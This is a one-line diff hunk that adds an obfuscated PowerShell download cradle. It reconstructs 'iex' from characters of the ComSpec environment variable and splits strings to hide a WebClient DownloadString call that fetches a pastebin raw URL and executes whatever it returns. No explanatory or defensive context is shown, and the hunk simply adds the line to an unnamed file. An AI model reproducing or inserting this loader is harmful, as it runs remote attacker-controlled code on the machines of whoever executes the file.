@@ -1,0 +1,1 @@
+ .( $env:CoMSpEc[4,24,25]-JoiN'') ( ('Invok'+'e-'+'Expression ('+'New-O'+'bject S'+'ystem'+'.Net'+'.WebCli'+'ent'+').Do'+'w'+'n'+'loadStr'+'in'+'g'+'('+'g'+'LChttps://pastebin.'+'com/r'+'aw/MKM5QLaPgLC'+')').rEplACE('gLC',[StRinG][char]39))
